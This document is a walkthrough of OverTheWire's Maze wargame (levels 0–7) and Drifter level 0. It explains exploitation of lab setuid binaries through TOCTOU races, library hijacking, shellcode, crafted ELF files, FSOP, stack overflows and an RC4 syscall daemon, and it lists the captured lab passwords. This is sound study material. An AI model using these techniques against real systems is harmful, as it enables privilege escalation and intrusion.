# OverTheWire Maze — Solutions

Every level solved live against `maze.labs.overthewire.org` (SSH, port 2225) in this run.
Maze levels are **setuid 32-bit binaries** under `/maze/`: `/maze/maze<N>` is owned by the
*next* user (`setuid maze<N+1>`), so the goal at each level is to run the level's binary and
make it **print the password for the next account**. That password then unlocks an SSH login
as `maze<N+1>`, from which you read `/etc/maze_pass/<next>` and move on.

For each level below: the goal, the technique and **why it works**, the exact commands, and a
**step-by-step account of the discovery process** (what the recording shows, where one exists,
or how the transcript unfolded otherwise). Per-level `cmds`/`out`/`pw` transcripts are in
`games/maze.json`; live notes in `tools/maze/l<N>/NOTES.md`; recordings in
`recordings/maze/L<N>.cast` where present.

**Verification rule used throughout:** a password is accepted only once an SSH login as the
next user works **and** `cat /etc/maze_pass/<next>` prints it.

---

## Level 0 → maze1

- **Account:** `maze0` (initial password `maze0`).
- **Goal:** get the password for `maze1` from `/maze/maze0`.
- **Technique and why it works:** `/maze/maze0` reads a fixed path
  `/tmp/128ecf542a35ac5270a87dc740918404` and does, in order:
  `access(PATH, R_OK)` → `setresuid(euid)` (drop to the setuid identity) → `open(PATH)` →
  read and print the contents. The **check and the open are two separate syscalls on the same
  path**, so the file that path names can change *between* them. That is the classic
  **check-then-open TOCTOU race**: pass `access()` a regular readable file you own, then swap
  the path to a symlink pointing at `/etc/maze_pass/maze1` before `open()` runs. `open()`
  follows the symlink, so it reads the password file while `access()` had already approved a
  harmless file. Because the swap happens in a tiny window, it only wins sometimes — so you
  run the binary in a tight loop and collect the rare winning outputs.
- **Commands:**
```
# 1. Disassemble to see the access()/open() split on the same fixed path
objdump -d /maze/maze0
# main(): access(PATH, R_OK) -> setresuid(euid) -> open(PATH) -> read/print
# PATH is /tmp/128ecf542a35ac5270a87dc740918404

# 2. Plant a readable filler file and a symlink to the next password
printf 'AAAA...' > /tmp/real_f
ln -s /etc/maze_pass/maze1 /tmp/link_s

# 3. A small C loop rename()s the fixed path back and forth between the two
#    (see the transcript in games/maze.json)

# 4. Fire the binary 15,000 times and keep the rare winners
for i in $(seq 15000); do /maze/maze0; done | sort | uniq -c
```
  Output: mostly `AAAA...` filler, but **132 winning runs** print `Sp5VmLGFC0`.

- **Step-by-step discovery and crafting** (from the narration script, `narration/maze/L0.txt`):
    1. **Read the binary first.** `objdump -d /maze/maze0` shows `main()` calls `access()` on a
       fixed `/tmp` path, drops privileges with `setresuid`, then `open()`s the *same* path and
       prints what it reads. The fixed path is a long md5-looking name.
    2. **Notice the two-step check.** Because `access()` and `open()` are separate calls on the
       same path, the file at that path can change in the gap. That gap is the whole exploit.
    3. **Build the two states.** A normal readable file full of `A`s at a path you own, and a
       symlink from the level's fixed path to `/etc/maze_pass/maze1`.
    4. **Race the rename.** A C loop flips the fixed path between the readable file and the
       symlink thousands of times while you run `/maze/maze0` in a loop.
    5. **Collect the winners.** Most runs see the readable file and print `A`s. The runs where the
       swap lands in the window pass the check on the file and `open()` the symlink: the
       password file comes back. 132 of 15,000 runs print `Sp5VmLGFC0`.
- **Password for maze1:** `Sp5VmLGFC0`
- **Verification:** confirmed by logging in as `maze1`. (Note 2026-11-17: the `maze0` login
  works again on the current lab, uid 15000 live, initial password `maze0`; the recorded solve
  stands.)
- **Recording:** none recorded — the transcript and narration are the record
  (`games/maze.json` L0, `narration/maze/L0.txt` + `L0.mp3`).

---

## Level 1 → maze2

- **Account:** `maze1`.
- **Goal:** get the password for `maze2` from `/maze/maze1`.
- **Technique and why it works:** `/maze/maze1` is setuid `maze2`, and its dynamic
  `DT_NEEDED` list includes `./libc.so.4` — a *relative* path (alongside the normal
  `libc.so.6`). A relative `DT_NEEDED` is resolved against the current working directory at
  exec time. So if you run the binary from a directory that contains a **planted**
  `libc.so.4`, the dynamic loader loads *your* library. A **constructor** in that library
  runs at load time — *before `main`* — with the setuid binary's fsuid (i.e. `maze2`), so it
  can `open()` and print `/etc/maze_pass/maze2` directly. No overflow, no shellcode: you just
  get code to run as `maze2` by controlling a library the binary is already going to load.
- **Commands:**
```
# 1. Confirm the relative DT_NEEDED
readelf -d /maze/maze1 | grep NEEDED
# 0x00000001 (RPATH/NEEDED) ... ./libc.so.4     <- the relative one
# 0x00000001 (NEEDED) ... libc.so.6

# 2. Build the planted library (tools/maze/l1/lib4.c) with a constructor
#    that reads /etc/maze_pass/maze2 and writes it to stdout.

# 3. Run the binary from a 755 dir containing the planted 32-bit libc.so.4
D=$(mktemp -d); chmod 755 "$D"; cp "$D/libc.so.4" ...; cd "$D"; /maze/maze1
# jJF6jn9qW6
# Hello World!
```

- **Step-by-step discovery and crafting** (from `tools/maze/l1/NOTES.md` + `lib4.c`):
    1. **Read the binary's load config.** `readelf -d /maze/maze1` reveals `DT_NEEDED ./libc.so.4`
       — a relative path. That is the hook: the loader will look for `libc.so.4` *in the
       current working directory* before anything else.
    2. **Plant a libc.so.4 with a constructor.** `lib4.c` defines an
       `__attribute__((constructor))` function that opens `/etc/maze_pass/maze2`, reads it, and
       `write()`s it to fd 1. Constructors run at load time, before `main`, and — because the
       binary is setuid — with the fsuid of the *owner* (`maze2`), which is exactly the identity
       that can read the password file.
    3. **Compile to a valid 32-bit shared object.** Two loader gotchas, both measured live:
       - the loader opens libraries using the setuid binary's **fsuid**, so the temp directory
       must be **755** (a 700 dir owned by `maze1` is unreadable by fsuid `maze2` → "Permission
       denied");
     - the planted file must be a **valid 32-bit ELF shared object** (an empty file → "file too
       short"; a 64-bit build → "wrong ELF class: ELFCLASS64").
  4. **Run from the planted directory.** `cd` into the 755 dir containing `libc.so.4` and run
     `/maze/maze1`. The loader loads the planted library, the constructor fires as `maze2`,
     and it prints `jJF6jn9qW6` (then `main` prints "Hello World!").
- **Password for maze2:** `jJF6jn9qW6`
- **Verification:** confirmed by logging in as `maze2` (uid 15002; `cat /etc/maze_pass/maze2`
  matches).
- **Recording:** `recordings/maze/L1.cast` — a genuine interactive SSH session as `maze1`
  (asciinema v3, typed commands + live output): `id`, `file`/`readelf -d` (the relative
  `./libc.so.4` NEEDED hook), `main` disassembly, ASLR check, the `lib4.c` constructor typed
  via heredoc, `gcc -m32` build of the planted `libc.so.4`, then `/maze/maze1` printing
  `jJF6jn9qW6` + "Hello World!". Recorded 2026-11-23 (real session, not a batch dump).
  Files: `tools/maze/l1/` (`lib4.c`, `NOTES.md`, live `maze1` copy).

---

## Level 2 → maze3

- **Account:** `maze2`.
- **Goal:** get the password for `maze3` from `/maze/maze2`.
- **Technique and why it works:** `main` (reconstructed from objdump with debug info) is:
```c
char buf[12];
void (*fp)(void) = &buf;      /* the address of buf is the function pointer */
if (argc != 2) exit(1);
strncpy(buf, argv[1], 8);     /* copy the first 8 bytes of argv[1] into buf */
fp();                         /* call buf — those 8 copied bytes now execute */
```
  The stack is **GNU_STACK RWE** (executable) and **ASLR is off**, so the 8 bytes you control
  via `argv[1]` run in place at a predictable stack address. The trick is that only **8 bytes**
  are copied, so you can't put full shellcode in `argv[1]`. Instead the 8 bytes are a tiny
  `push imm32; ret` (6 real bytes + 2 pad) that jumps to an **absolute address** where the real
  shellcode lives — a big **NOP sled** in the environment. The shellcode itself does the
  privilege work: `open("/etc/maze_pass/maze3")`, read, and write the bytes to fd 1 **and** fd 2
  (so the answer is unmissable), then exit.
- **Commands:**
```
# 1. Read the program: argc gate, strncpy(8), call through buf's address
objdump -d /maze/maze2          # lea eax,[ebp-0xc]; mov [ebp-0x10],eax; call eax
readelf -l /maze/maze2         # GNU_STACK RWE
getconf PAGESIZE; sysctl kernel.randomize_va_space   # ASLR off

# 2. Corrected int 0x80 shellcode (tools/maze/l2/sc.asm) assembles to 71 NUL-free bytes:
#    open("/etc/maze_pass/maze3") -> read -> write(count) to fd 1 AND fd 2 -> exit.
#    Path dwords pushed in REVERSE chunk order (aze3 first, /etc last) so the stack
#    holds "/etc/maze_pass/maze3\0" forwards.

# 3. Driver: env = 'A'*2000 + shellcode; sweep 4-aligned stack targets.
#    For each candidate address T: argv[1] = \x68 <T> \xc3 AA
#      (push imm32=T ; ret ; 2 pad bytes) -> jumps into the env sled at T.
#    Run /maze/maze2; stop when the 10-byte password is printed twice.
```
  Sweep hit at **0xffffd6e8** in the recorded run (an earlier trial session hit
  `0xffffd6e0` — the sled's exact address varies with the environment layout),
  dumping the 10-byte password twice (the fd1+fd2 signature):
  `pKWcO3NfC6`.

- **Step-by-step discovery and crafting** (from `tools/maze/l2/NOTES.md` + `narration/maze/L2.txt`):
    1. **Disassemble and find the call.** `main` copies the first 8 bytes of `argv[1]` into a
       12-byte buffer whose *address* is held in a function pointer, then calls through it. So the
       8 bytes you send in `argv[1]` are executed as code.
    2. **Prove the mechanism live.** Put `int3` in `argv[1]` → SIGTRAP; put 8 `A`s → the `A`s
       run as code and crash. Confirmed the 8 copied bytes execute at a known, RWE, non-ASLR stack
       address.
    3. **Decide on delivery.** 8 bytes is too small for the full shellcode, so make the 8 bytes a
       6-byte `push imm32; ret` that jumps to an absolute address, and hide the real shellcode in
       the environment behind a huge NOP sled (its exact address is fuzzy, the sled absorbs the
       error).
    4. **Write the shellcode to do the job.** `open("/etc/maze_pass/maze3")` via `int 0x80`, read
       into a stack buffer, `write()` the byte count to **fd 1 and fd 2**, exit. Crucially, push
       the path dwords in **reverse** chunk order so the assembled string reads forwards (this is
       the bug that bit the previous attempt — see below). 71 bytes, no NULs.
    5. **Sweep the target address.** For every 4-byte-aligned address from the low stack upward,
       build `argv[1] = \x68 <T> \xc3 AA`, run `/maze/maze2`, and stop when anything is printed.
       Hit at `0xffffd6e8` (recorded run), printing the 10-char password twice.
    6. **The "it works but empty output" puzzle (the hard part).** The first shellcode attempt
       dumped nothing. Two independent bugs, both diagnosed:
       - the 85-byte pass-reader pushed its path dwords in **forward** chunk order, so the stack
         held the string *backwards* (`nib/hs//3ezam/ssap_ezam/cte/`) and `open()` returned
         ENOENT → empty output;
       - the marker-shell HIT condition could never match: a `execve("/bin//sh")` stage ran, but
         the spawned dash drops the elevated euid after `execve` (no `-p`), so `id` showed
         uid=15002 and the sweep's `uid=15003` condition never fired.
     Fix: read the file **inside the shellcode** before any `exec`, with the path dwords in
     reverse order.
    7. **Finalize.** Read the hit address from `hit.txt`, re-run `/maze/maze2` with
       `argv[1] = push <hit>; ret` once, and take the printed password.
- **Password for maze3:** `pKWcO3NfC6`
- **Verification:** confirmed by SSH login as `maze3` (uid 15003; `cat /etc/maze_pass/maze3`
  matches).
- **Recording:** `recordings/maze/L2.cast` — a genuine interactive SSH session as `maze2`
  (typed commands, heredoc-typed shellcode + sweep driver, live sweep hitting
  `0xffffd6e8` after 215 targets, live re-exploit printing the password).

---

## Level 3 → maze4

- **Account:** `maze3`.
- **Goal:** get the password for `maze4` from `/maze/maze3`.
- **Technique and why it works:** `/maze/maze3` is a tiny **hand-written assembly stub** (see below)
  statically linked, 0xa3 bytes of `.text`, entry `0x8049000`. It has two paths:
  - `argc == 1`: prints `./level4 ev0lcmds!` and exits (a red herring);
  - `argc != 1`: `mprotect(0x8049000, 0xa3, 7)` makes its own text page **RWX**, then
    XOR-decrypts 0x38 dwords at `0x804906b` with key `0x12345678` and falls into the
    decrypted bytes.
  So the "payload" is sitting in the binary, encrypted. You XOR it back with the key, read the
  resulting assembly, and learn its *gate*: it checks that `argv[1][0..3] == de c0 37 13`
  (little-endian `0x1337c0de`), and only if that matches does it `setreuid(15004,15004)`
  (= `maze4`) and `execve("/bin//sh")`. So the exploit is simply: **run `/maze/maze3`** with
  an argument whose first four bytes are `de c0 37 13` (`0x1337c0de` little-endian) — you
  get a shell as `maze4`.
- **Commands:**
```
# 1. Identify the program
file /maze/maze3                      # ELF 32-bit, statically linked, not stripped
readelf -h /maze/maze3 | grep -i entry # Entry point 0x8049000
objdump -d /maze/maze3                # whole .text is 0xa3 bytes; two paths

# 2. Recover the XOR-decrypted payload (key 0x12345678)
python3 - <<'PY'
key=0x12345678
# 0x38 dwords at 0x804906b (from the dumped section)
# payload -> pop eax; cmp [eax],0x1337c0de; jne exit;
#           ebx=0x3a9c(15004); eax=70(setreuid); int 0x80; execve("/bin//sh")
PY

# 3. Run with the argv magic
/maze/maze3 $(printf '\xde\xc0\x37\x13')
# uid=15004(maze4) gid=15003(maze3)
cat /etc/maze_pass/maze4   # MB583SjyFZ
```

- **Step-by-step discovery and crafting** (from `games/maze.json` L3 + `narration/maze/L3.txt`):
    1. **Read the stub.** `file`/`readelf`/`objdump -d` show the whole program is 0xa3 bytes with
       an `argc` branch: one path just prints a string, the other does the work.
    2. **Decode the work path.** The `argc != 1` branch `mprotect`s its text page to RWX, then
       XOR-decrypts 56 dwords at `0x804906b` with `0x12345678` and executes the result. So the real
       logic is the decrypted payload.
    3. **Decrypt it.** Re-XOR the 56 dwords with `0x12345678` (a short python one-liner) and read
       the revealed assembly: compare `[argv[1]]` against `0x1337c0de`, and on a match do
       `setreuid(15004,15004)` (maze4) + `execve("/bin//sh")`.
    4. **Meet the gate.** The argument must begin with the bytes `de c0 37 13`
       (`0x1337c0de` little-endian).
    5. **Run it.** `/maze/maze3 $(printf '\xde\xc0\x37\x13')` → shell as `maze4`
       (uid=15004, gid stays 15003). `cat /etc/maze_pass/maze4` → `MB583SjyFZ`.
- **Password for maze4:** `MB583SjyFZ`
- **Verification:** confirmed by SSH login as `maze4` (uid 15004; password file matches).
- **Recording:** `recordings/maze/L3.cast`.

---

## Level 4 → maze5 (SOLVED 2026-11-23)

- **Account:** `maze4` (initial password `MB583SjyFZ`).
- **Goal:** get the password for `maze5` from `/maze/maze4`.
- **Technique:** the binary is a stat-then-exec gate. Its two reads and the lseek are
  misaligned with the data they check — the "size" used by `lseek` is actually read back
  out of the first-read buffer (the file's own bytes 28..31), and the compared dword comes
  from the second read at `offset+12`. A hand-built 123-byte ELF passes the gate for free
  (ELF header bytes 7,8 are 0 → product 0; the program header's `p_paddr` — ignored by the
  kernel — is the compared dword → 0 == 0), and because `/maze/maze4` is setuid maze5 and
  the ELF execs `dash -p`, the elevated euid survives to a `cat` of the password file.

### Step-by-step discovery and crafting

1. **Read the binary.** `/maze/maze4` is 16392 bytes, i386, with debug info, mode
   `4750 maze5:maze4`. `objdump -d -M intel` reconstructs main:

   ```c
   fd = open(argv[1], O_RDONLY);
   stat(argv[1], &st);
   read(fd, bufA, 52);                    /* bufA = ebp-0x38 */
   lseek(fd, *(int *)(bufA + 28), SEEK_SET);   /* NOT st_size! */
   read(fd, bufB, 32);                    /* bufB = ebp-0xb0 */
   if (*(int *)(bufB + 12) == (unsigned char)bufA[7] * (unsigned char)bufA[8]
       && st.st_size <= 123) {
       puts("valid file, executing");
       execv(argv[1], argv);
   }
   ```

2. **Pin the operands with gdb** (break `0x8049318`, the compare): `[ebp-0x31]` = bufA+7
   = file byte 7, `[ebp-0x30]` = file byte 8, `[ebp-0xa4]` = bufB+12, and — the trap —
   `[ebp-0x1c]` (the lseek argument) is **bufA+28**, i.e. the offset comes from the file's
   own bytes 28..31, not from `st_size`. Verify against a known file (`"#!/bin/sh..."`
   → factors `s*h` = 115·104 = 11960).

3. **First attempt — a shell script.** The gate is satisfiable by a script: hide the magic
   dword and the offset dword inside the line-2 comment (`tools/maze/l4/mkpay.py`, 71
   bytes). It prints `valid file, executing` — but `/tmp` on this lab is a **tmpfs mounted
   `nosuid`** (the setuid bit never applies there), and even from `/run/screen` (root ext4,
   suid-friendly) `dash` without `-p` drops the inherited euid maze5 back to maze4 for its
   children. `id` inside the script: `uid=15004 euid=15004`.

4. **The winning payload — a 123-byte hand-built ELF** (`tools/maze/l4/tinel.py`):
   - an ELF passes the arithmetic for free: bytes 7,8 are `EI_OSABI`/`EI_ABIVERSION`
     = 0,0 → product 0; `e_phoff` = 52 → the lseek offset; the second read (bytes
     52..83) is the program header, and `phdr+12` = `p_paddr`, which the kernel ignores —
     set **p_paddr = 0** and the compare is 0 == 0.
   - size 52+32+26 = 123 ≤ 123 exactly.
   - strings `sh\0-p\0` hide in `e_ident[9..14]` (the EI_PAD area).
   - the 26-byte stub at file offset 84 (vaddr 0x08048000+84) runs
     `execve("sh", {"sh","-p",NULL}, NULL)` — `sh` is a dash copy in the cwd, and `-p`
     makes dash **keep** the elevated euid.

   ```sh
   mkdir -p /run/screen/l4 && cd /run/screen/l4   # /tmp is nosuid!
   cp /bin/sh ./sh
   python3 tinel.py          # writes ./tiny (123 bytes)
   chmod 755 tiny sh
   echo "id" | /maze/maze4 tiny
   # valid file, executing
   # uid=15004(maze4) gid=15004(maze4) euid=15005(maze5)
   echo "cat /etc/maze_pass/maze5" | /maze/maze4 tiny
   # valid file, executing
   # A3846ZPJuH
   ```

5. **Why it works end to end:** `/maze/maze4` is setuid maze5, so the kernel gives the
   process `euid=15005`; `execv` of our ELF keeps that euid; the stub re-execs dash `-p`,
   which preserves it; `cat` then reads `/etc/maze_pass/maze5` (mode 400 maze5).

- **Password for maze5:** `A3846ZPJuH`
- **Verification:** confirmed by SSH login as `maze5` (uid 15005; password file matches).
- **Recording:** `recordings/maze/L4.cast`.
- **Gotcha worth remembering:** `/tmp` is `nosuid` on the maze lab — do setuid work under
  `/run/screen` (root filesystem).

---

## Level 5 → maze6 (SOLVED 2026-11-23)

- **Account:** `maze5` (initial password `A3846ZPJuH`).
- **Goal:** get the password for `maze6` from `/maze/maze5`.
- **Technique:** keygen. The binary asks for an 8-char username and 8-char key
  (`scanf("%8s")`), has a `ptrace(TRACEME)` anti-debug check, and validates the pair in
  `foo()`: starting from the template `"printlol"`, it computes
  `dec[i] = T[i] - (2*i + user[i] - 'A')` byte-wise (mod 256), then reverse-scans
  `dec[i] == key[i]` — returning success only when the index wraps to −1. The key is
  therefore a closed-form derivation from any chosen username.

### Step-by-step discovery and crafting

1. **Read the binary.** `/maze/maze5` (14940 bytes, i386, debug info, mode `4750
   maze6:maze5`). Imports give the shape away: `scanf("%8s")` twice, `ptrace`, `strlen`,
   `setreuid`, `system("/bin/sh")`.
2. **Disassemble main + foo.** main: prompt → `%8s` username → `%8s` key → length==8
   checks → `ptrace(0,0,0,0) != 0 → "nahnah..."` → `foo(user,key)` → on success
   `setreuid(euid, euid); system("/bin/sh")`. foo: template `dec = "printlol"`
   (two dword stores `0x6e697270`/`0x6c6f6c74` + NUL), the forward loop
   `dec[i] -= 2*i + (user[i]-'A')`, and the reverse compare loop.
3. **Solve the equation.** The forward pass and the reverse compare together mean
   `key[i] = T[i] - 2*i - (user[i]-'A')  (mod 256)` for i = 0..7. The username is free;
   take `AAAAAAAA` (offset 0): key = `ppehlbc^` (`70 70 65 68 6c 62 63 5e`).
   (`tools/maze/l5/solve.py` derives and replays it.)
4. **Run it — on a tty.** The spawned shell ignores piped stdin (it stalls silently);
   run the level over `ssh -tt` and type at the prompts:

   ```sh
   ssh -tt -p 2225 maze5@maze.labs.overthewire.org
   maze5@gibson:~$ /maze/maze5
    Username: AAAAAAAA
        Key: ppehlbc^

   Yeh, here's your shell
   $ id
   uid=15006(maze6) gid=15005(maze5) groups=15005(maze5)
   $ cat /etc/maze_pass/maze6
   dXEKrdYgQR
   ```

   (Under strace the `ptrace(TRACEME)` trips — "nahnah..."; debug the static copy
   instead. `setreuid(euid,euid)` fixes both uids to maze6, so `id` shows
   uid=15006 with gid still 15005.)

- **Password for maze6:** `dXEKrdYgQR`
- **Verification:** confirmed by SSH login as `maze6` (uid 15006; password file matches).
- **Recording:** `recordings/maze/L5.cast`.

---

## Level 6 → maze7 (SOLVED 2026-11-23)

- **Account:** `maze6` (initial password `dXEKrdYgQR`).
- **Goal:** get the password for `maze7` from `/maze/maze6`.
- **Technique:** stack overflow through an unbounded `strcpy` into a FILE-based
  arbitrary write. `main` copies `argv[2]` into a 0x100-byte buffer with no bound,
  frobnicates it (XOR 42 — an involution), and ends with `exit(0)` — so the saved
  EIP is dead and the exploit must corrupt the `FILE *f` (FSOP) plus repair the
  caller frame, then hijack `exit@GOT` and pivot to shellcode that reads the
  password file directly.

### Step-by-step discovery and crafting

1. **Read the binary.** `/maze/maze6` (14352 bytes, i386, debug info, mode `4750
   maze7:maze6`): `fopen(argv[1],"a")` → `strcpy(buf[0x100], argv[2])` →
   `memfrob(buf, strlen(buf))` → `fprintf(f, "%s : %s\n", argv[1], buf)` →
   `exit(0)`. `GNU_STACK RWE`, ASLR off.
2. **Recognize the two primitives.** memfrob XORs with 42 (involution): send
   `payload ^ 42` as argv[2] and `buf` arrives as the raw payload (a raw NUL
   rides in argv[2] as a `*` byte — the payload must avoid 0x2a). And since
   main calls `exit(0)`, overwriting the saved EIP is pointless — the targets
   are the `FILE *f` at buf+0x100 and the caller frame.
3. **Repair the caller frame.** The overflow smashes argc/argv/envp
   (buf+0x10c..0x114) and the argv[] array (buf+0x1d0): restore argc=3, argv →
   the rebuilt array inside the payload, and point argv[1] at a **path string
   copied into the payload** — pointing it at the original path left the
   fprintf line length env-dependent and the GOT write always missed.
4. **Forge the FILE.** Copy the real heap FILE struct byte-exactly (0xa0 bytes —
   the first 0x8c-byte copy missed the vtable pointer at offset 0x94 and glibc
   aborted with `invalid stdio handle`), redirect `_IO_write_base/_IO_write_ptr`
   to `exit@GOT - 24`, extend write_end/buf_end. The real vtable
   (`_IO_file_jumps`) passes glibc's vtable check, so fprintf memcpy's the line
   `path : buf` into the GOT — line offset 24 lands **buf[0..4] exactly on
   exit@GOT**.
5. **Hijack exit.** buf[0..4] = `leave; ret` (libc+0x1af32e). After fprintf
   returns, `call exit@plt → jmp *exit@GOT` runs leave;ret: `esp := ebp`
   (main's ebp = our value at buf+0x104), `pop ebp`, `ret` → eip = [buf+0x108]
   = the shellcode (open/read/write `/etc/maze_pass/maze7` to fd 1 — no execve,
   dash would drop the euid).
6. **Hit the stack address.** buf depends on the environment; sweep it
   (`fire.py`, ±0x1000 in 4-byte steps) — HIT at `buf = 0xffffcfb4` in the
   recorded pty session:

   ```
   $ python3 fire.py
   HIT buf 0xffffcfb4
   ckkOx2s4Ev
   ```

- **Password for maze7:** `ckkOx2s4Ev`
- **Verification:** confirmed by SSH login as `maze7` (uid 15007; password file matches).
- **Recording:** `recordings/maze/L6.cast`.

---

## Maze — Level 7 → Level 8

**Level goal:** `/maze/maze7` runs as `maze8`; hand it a file it will parse and
make it print the contents of `/etc/maze_pass/maze8`.

### The program

`maze7` is an ELF section-header printer. `main` reads the first `0x34` bytes
of `argv[1]` (the ELF header) into a 0x34-byte stack buffer, then calls
`Print_Shdrs(fd, e_shoff, e_shstrndx, e_shnum, e_shentsize)` — **every
"parameter" comes straight from the file being parsed**. Inside
`Print_Shdrs`:

1. `lseek(fd, e_shoff)`; `malloc(e_shnum * 40)`; read the section-header array.
2. `sh = buf + e_shstrndx*40`; `lseek(sh->sh_offset)`; `malloc(sh->sh_size)`;
   read the string table.
3. Print loop `i = 0 .. e_shnum` **inclusive** (a `jle` — off by one). Each
   iteration re-reads the section header it is about to print:

   ```c
   read(fd, header, e_shentsize);      /* header = 0x34-byte stack buffer */
   printf("%2d: %-16s\t0x%08x\t0x%04x\n", i, strtab + sh_name, ...);
   ```

4. `free(strtab); free(shdrbuf);` — both pointers live at `header+0x28` /
   `header+0x30`, inside the overflow window.

### The bug

On a real ELF `e_shentsize` is 40, matching `sizeof(Elf32_Shdr)`, so the
per-iteration read is harmless. In a **crafted** file `e_shentsize` is just a
number — set it to 0x100 and every loop iteration reads 256 bytes into the
0x34-byte buffer. The read starts at file offset `e_shoff`, so the
section-header-array region of the file **is** the overflow payload, with
NUL bytes allowed. Saved EIP sits at `header+0x40`.

### The exploit (`tools/maze/l7/gen.py`)

Craft a 640-byte "ELF" with `e_shoff = 0x40`, `e_shnum = 1`,
`e_shentsize = 0x100`:

```
0x00  Elf32_Shdr #0   (sh_name = 0 → printf's %s sees strtab+0 = a NUL byte)
0x28  [ebp-0x14] free(strtab)  → 0x0804d050  (real heap address, repaired)
0x30  [ebp-0xc]  free(shdrbuf) → 0x0804d020  (real heap address, repaired)
0x34  [ebp-0x8]  loop counter i → 1   (i++ makes 2 > e_shnum: clean exit)
0x40  saved EIP → buf+0x60
0x60  69-byte shellcode: open/read/write /etc/maze_pass/maze8 → fd 1
```

Traps hit along the way:

1. **Payload offset.** Appending the payload at 0x34 while `e_shoff` was 0x40
   shifted every control dword 12 bytes early — `free()` received 1 and 0, EIP
   was 0. Pad the header to `e_shoff`.
2. **The heap is not executable.** The first EIP target was the malloc'd
   string table (heap is `rw-p`); only the stack is executable
   (`GNU_STACK RWE`). The shellcode rides inside the payload at buf+0x60.
3. **printf's `%s`.** The `%s` argument is `strtab + sh_name` — the shellcode
   bytes themselves in early builds, an unterminated garbage string that
   crashed inside vfprintf. Give the strtab a leading NUL so it prints empty.
4. **free() repairs.** Both heap pointers are inside the overflow window;
   restore them with the real malloc addresses (gdb-measured once, ASLR is
   off) or glibc aborts with `free(): invalid size`.
5. **Shellcode push order.** `push imm32` writes the immediate
   little-endian-reversed: the path chunks must be pushed so the stack holds
   `/etc/maze_pass/maze8\0` forward (a wrong order yields
   `/etc/maze_pass/m8eza` → ENOENT).
6. **Address sweep.** The buffer address is environment-dependent (gdb:
   `0xffffdb34`); sweeping ±0x1000 in 4-byte steps **inside the recorded
   session itself** (the L6 lesson) hit **buf = 0xffffd308**:

   ```
   $ /maze/maze7 /run/screen/l7/evil.elf
   avdYfGdEvv
   ```

- **Password for maze8:** `avdYfGdEvv`
- **Verification:** confirmed by SSH login as `maze8` (uid 15008; password file matches).
- **Recording:** `recordings/maze/L7.cast`.

---

# Drifter

## Drifter — Level 0

**Level goal:** The source of `/drifter/drifter0` (world-readable, Vortex
style) shows a daemon that chroots to `/home/drifter0/chroot`, drops to uid
19000, listens on port 1111, and executes **arbitrary syscalls** from
RC4-encrypted frames. Get it to read `/drifter0.password` (mode 400, owner
drifter0 — exactly the dropped uid) and send it back.

### The protocol (`/drifter/drifter0_src/drifter0.c`)

- `keymat = sin_addr (4 bytes) + sin_port (2 bytes)` of the accepted
  connection — as the **server** sees it.
- Two independent RC4 states (`key_in`, `key_out`) prepared from keymat; both
  streams then skip 42 iterations of `rc4(keymat, 6)` = 252 keystream bytes.
- Loop: `read(skt, &args, 36)` → `rc4(args, 36, key_in)` →
  `syscall(args[0], args[1..8])` → `rc4(&ret, 4, key_out)` → `write` it back.

### Traps hit

1. **The keymat is *my* socket name, not the server's.** `getpeername()` on
   the client returns the server's port (1111); the server keys on
   `getsockname()` — my IP and ephemeral port. Every "garbage getpid" came
   from this. Validated by building the daemon locally from the same source
   (stub chroot/setresuid, port 21111) and diffing keystreams.
2. **No memory to point at.** Syscall args are values, not pointers. First
   `mmap2(0x10000000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS,
   -1, 0)` to get a scratch page.
3. **Which fd is the socket?** `lseek` can't distinguish EBADF from ESPIPE
   (both −9... here both surfaced as −1 through the syscall wrapper);
   `fstat(fd, statbuf)` returns 0 only for open descriptors → the accepted
   socket is **fd 4**.
4. **Delivering data.** The path string goes over the same socket: send the
   `read(4, buf, n)` *frame* first, then the raw bytes — the server is
   blocked in `read()` for the frame, executes the syscall, and the syscall
   consumes the raw bytes that follow.
5. **Exfil ordering.** `write(4, buf, n)` emits the n raw bytes during the
   syscall; its own 4-byte RC4 reply lands *after* them on the stream.

Run the client **on the backend** (any game's ssh session): the daemon sees
the client's real source IP, so from the lab the keymat IP is 127.0.0.1.

```
$ python3 exploit.py 127.0.0.1 1111
getuid -> 19000
mmap2 -> 0x10000000
socket fd: 4
read path -> 19
open -> 3
read file -> 33
EXFIL raw: b'yttCfzKiorcOz5V0Nr9AVk6SZ13IonYV\n'
```

- **Password for drifter0:** `yttCfzKiorcOz5V0Nr9AVk6SZ13IonYV`
- **Verification:** confirmed by SSH login as `drifter0` (uid 19000, port 2230; password file matches).
- **Recording:** `recordings/drifter/L0.cast`.
